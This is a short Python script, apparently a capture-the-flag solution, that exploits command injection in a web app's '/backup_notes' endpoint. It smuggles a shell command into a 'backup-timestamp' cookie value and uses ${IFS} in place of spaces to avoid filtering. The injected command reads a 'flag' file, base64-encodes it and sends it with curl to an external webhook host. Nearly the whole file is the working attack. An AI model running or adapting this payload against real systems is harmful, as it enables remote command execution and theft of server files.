
import requests
from bs4 import BeautifulSoup


url = ""

cookie = {
    'backup-timestamp': r'''val&&curl${IFS}"https://052d0150-152b-434f-a2c2-8cd5c4994299.webhooksite.net?c=$(cat${IFS}flag|base64|tr${IFS}-d${IFS}'\n')"'''
}

proxies = {
    'http':'http://localhost:8080',
    'https':'http://localhost:8080'
}

req = requests.post(url=url + '/backup_notes', 
                    cookies=cookie,
                    proxies=proxies,
                    timeout=5)

print(BeautifulSoup(req.text))